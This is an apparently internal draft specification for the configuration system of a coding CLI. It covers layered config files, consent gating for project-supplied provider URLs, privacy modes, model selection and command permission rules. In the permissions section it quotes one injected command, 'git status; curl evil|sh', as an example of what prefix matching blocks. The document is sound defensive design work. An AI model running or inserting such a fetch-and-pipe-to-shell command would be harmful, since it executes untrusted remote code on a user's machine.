# AGI CLI — Volume 15 — Configuration

Status: Draft spec
Owner: Founder + platform lead
Last updated: 2026-07-01

Authority: `AGENTS.md`, `docs/current/source-of-truth.md`, `docs/products/README.md`, `apps/cli/AGENTS.md`, `docs/cli/COMMAND_SURFACE.md`. Grounded in real CLI source: `apps/cli/src/config.rs`, `apps/cli/src/permissions.rs`, `apps/cli/src/exec_policy.rs`, `apps/cli/src/cli_options.rs`, `apps/cli/src/agent/mod.rs`, and `apps/cli/src/lib.rs`. Model IDs come only from `packages/contracts/types/src/models.json`.

## Overview & stance

Configuration is where AGI CLI's trust boundary is set, not just its preferences. The CLI is one of the three surfaces exposing all three trust modes — **Local**, **BYOK**, **Managed Cloud** — so configuration must make the active mode explicit and never let a file silently move a session across a boundary. `apps/cli/src/config.rs` layers configuration in a fixed precedence — built-in defaults, then global `~/.agiworkforce/config.toml`, then project `.agiworkforce/config.toml`, then environment overrides — via `CliConfig::load_merged()` (✅ Built). A project file is untrusted input: a remote `base_url` in project config is **consent-gated** before it can route prompts or keys (`consent_gate_project_providers`, ✅ Built). Sessions are workspace/session-scoped; configuration never enables automatic app-chat sync. All examples use the `agi` binary; `agiworkforce` is a compatibility alias only.

## Global Configuration

The global file is `~/.agiworkforce/config.toml`; the directory is created owner-only (`0o700`) by `CliConfig::config_dir()`, and the file resolves via `config_path()` (✅ Built, `config.rs`). It holds three tables — `[default]`, `[ui]`, and `[providers.*]` — and is loaded by `CliConfig::load()`, falling back to built-in defaults when absent. `agi --config` prints the effective configuration with **provenance** (which value came from global, project, or env) via `CliConfig::display()` (✅ Built). Config keys are settable programmatically through `set_value` (valid keys: `model`, `provider`, `max-tokens`, `temperature`, `stream`, `fallback-model`, `fallback-chain`, `fast-model`, `output-style`, `privacy-mode`; ✅ Built). Requirement: `validate()` must reject an empty model/provider and a `max_tokens` outside `1..=200000` before any turn runs.

## Project Configuration

A per-repo file at `.agiworkforce/config.toml` in the working directory is discovered by `load_project_config()` and merged **over** global values (✅ Built). Because a cloned repo can ship this file, it is treated as hostile: `has_sensitive_project_overrides()` flags any `providers.*.base_url`, and `consent_gate_project_providers()` prompts before honoring any **non-loopback** provider endpoint (the MED-1 credential-exfiltration vector). A trusted decision is remembered per `(project, provider, url)` fingerprint in `~/.agiworkforce/trusted_project_providers.json` (`0o600`); on denial or in a non-interactive session the `base_url` is **dropped**, never used (✅ Built). Loopback endpoints (`localhost`, `127.0.0.1`, `[::1]`) need no consent. Requirement: project config may never silently redirect a BYOK key to a remote host.

## User Profiles

There is one canonical user profile today: the global `~/.agiworkforce/` config directory plus account identity carried in the `AuthStore` (`account_id` on OAuth entries; see Volume 03) — ✅ Built. The user's default trust posture is a profile-level setting: `ui.privacy_mode` (`local` / `byok` / `managed`) is applied to new sessions by `apply_ui_config()` and enforced by `validate_privacy_boundary()` (✅ Built, `agent/mod.rs`). Named, switchable multi-profile support (for example separate work/personal identities selectable per invocation) is **not** implemented — 🔭 Planned. Do not describe profile switching as shipped; the durable unit is the single global directory plus its auth store.

## Provider Configuration

Each provider is a `[providers.<name>]` table with `api_key_env` and optional `base_url` (`ProviderConfig`, ✅ Built). The built-in table seeds Anthropic, OpenAI, Google, Mistral, xAI, DeepSeek, Perplexity, Qwen, Moonshot, Zhipu, OpenRouter, NVIDIA, `ollama` (loopback `:11434`), `ollama-cloud`, and `lmstudio` (loopback `:1234/v1`) — ✅ Built (`config.rs`). Keys are resolved at call time from the environment via `resolve_api_key(provider)`; the CLI stores no plaintext keys in `config.toml`. Local providers with a loopback `base_url` and no key are classified `PrivacyMode::Local` by `provider_privacy_mode()`/`is_local_provider_url()` (✅ Built), which is what keeps a Local session from silently reaching a cloud endpoint. Requirement: provider `base_url` must be shown in `--config` output with a set/not-set key indicator (✅ Built).

## Model Selection — from the catalog

The default model is derived from `packages/contracts/types/src/models.json` through `model_catalog::default_model()` (verified: resolves to `claude-opus-4-8`) — never hardcoded in `config.rs` (✅ Built). Selection settings live in `[default]`: `model`, `provider`, `fallback_chain` (ordered failover), `fast_model`, `review_model`, and `cloud_model`. `agi models list | status | scan | set` manage the catalog and local inventory (Volume 03), and mid-session `switch_model()` re-detects the provider and re-adopts the correct privacy mode, refusing unknown IDs (✅ Built, `agent/mod.rs`). Requirement: any configured model ID must exist in the catalog or in discovered local models; an unknown hosted ID fails closed rather than defaulting to a provider guess.

## Default Settings

`[default]` carries the runtime defaults (✅ Built, `config.rs`): `stream` (true), `max_tokens` (8192), optional `temperature`, `approval_mode` (`suggest`; also `auto-edit`, `full-auto`), `sandbox_mode` (`off` / `read-only` / `workspace` / `full-auto`), and `mcp_initialize_timeout` / `mcp_call_tool_timeout`. `[ui]` carries `output_style` and `privacy_mode`. `merge_from()` treats only non-default values as overrides so global/project layering is predictable. Requirement: changing `approval_mode` or `sandbox_mode` must never widen filesystem or network access without the permission checks below staying in force.

## Environment Variables

Only three variables are merged into config by `merge_env_overrides()` and recorded in provenance: `AGIWORKFORCE_MODEL`, `AGIWORKFORCE_PROVIDER`, `AGIWORKFORCE_MAX_TOKENS` (✅ Built, `config.rs`). Provider API keys are read from each provider's `api_key_env` (e.g. `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`). Additional runtime flags are read at their call sites and grounded in CLI source — e.g. `AGIWORKFORCE_NO_KEYRING`, `AGIWORKFORCE_NO_SANDBOX`, `AGIWORKFORCE_NO_TUI`, `AGIWORKFORCE_DEBUG`, `AGI_TEAM`, `AGI_POWERSHELL_ALLOW_UNSAFE` — 🟡 Partial (behavior is per-call, not centralized in the config layer; verify each in source before relying on it). Do not invent env var names beyond those present in the tree. Requirement: env values override files but must still pass `validate()`.

## Permission Policies

Command-execution policy is enforced by `apps/cli/src/permissions.rs` and `apps/cli/src/exec_policy.rs` (✅ Built). Rules persist in `~/.agiworkforce/permissions.toml` (`0o600`) as allow/deny/`workspace_rules`, with an in-memory process-session allowlist. Matching uses token-prefix comparison that blocks shell metacharacters so `git status; curl evil|sh` cannot slip past a `git status` allow (AUDIT-FIX C-2, ✅ Built). `exec_policy` supports `Prefix`, `Regex`, `Heuristic`, and `Program` matchers with **Deny taking precedence over Allow**. Session behavior is set by `PermissionMode` (`Default`, `Plan`, `acceptEdits`, `bypassPermissions`, `dontAsk`; ✅ Built, `cli_options.rs`); the tabbed `/permissions` view exposes `recently-denied`, `allow`, `ask`, `deny`, `workspace`. Requirement: `bypassPermissions`/`dontAsk` must still respect deny rules and the Local trust boundary.

## Repository map

- `apps/cli/src/config.rs` — `CliConfig`, layering/precedence, provider table, project-provider consent gate, `set_value`, `display`, `validate`.
- `apps/cli/src/permissions.rs` — `permissions.toml`, allow/deny/workspace rules, token-prefix matching.
- `apps/cli/src/exec_policy.rs` — policy matchers, Deny-over-Allow precedence.
- `apps/cli/src/cli_options.rs` — `PermissionMode`, per-invocation options.
- `apps/cli/src/agent/mod.rs` — `PrivacyMode`, `validate_privacy_boundary`, `apply_ui_config`.
- `packages/contracts/types/src/models.json` — model catalog SSOT.

## Competitor notes

Claude Code and Codex CLI center on a single first-party provider and a mostly flat settings file. AGI diverges deliberately: a **multi-provider** table with no markup, **BYOK where allowed** (CLI/Desktop/VS Code only), **per-surface trust** enforced in config (`privacy_mode` gates routing), and **local-first** defaults where loopback providers are auto-classified Local. Uniquely, project config is consent-gated against credential exfiltration — a hostile-repo threat model most competitor CLIs do not encode in configuration.

## Acceptance / Definition of Done

- [ ] Build: `cargo check -p agiworkforce-cli` and `cargo test -p agiworkforce-cli --lib` green, including config precedence and privacy-boundary tests.
- [ ] Trust: project config cannot route to a remote `base_url` without a remembered consent decision; `privacy_mode` defaults are honored; no config path enables automatic app-chat sync.
- [ ] Security: `~/.agiworkforce/` is `0o700`, `permissions.toml`/`trusted_project_providers.json` are `0o600`; keys read from env only and redacted from `--config`; deny rules override allow.

## Anti-patterns

- Letting project config silently redirect a provider `base_url` or key to a remote host, or routing Local sessions to BYOK/Managed via a config value.
- Hardcoding or inventing model IDs instead of reading `packages/contracts/types/src/models.json`; defaulting to a provider guess on an unknown ID.
- Claiming named multi-profile switching, or any env var not present in source, as shipped.
- Reintroducing removed tiers (Plus, `pro_plus`, Hobby), credit top-ups, or invented Pro/Max INR prices in config surfaces.
- Weakening `0o600`/`0o700` file modes, printing keys in logs or `--config`, or letting `bypassPermissions` skip deny rules.
- Referencing Supabase (use Clerk + Neon + Stripe) or renaming `proxy.ts` to `middleware.ts`; using `agiworkforce <cmd>` in examples.
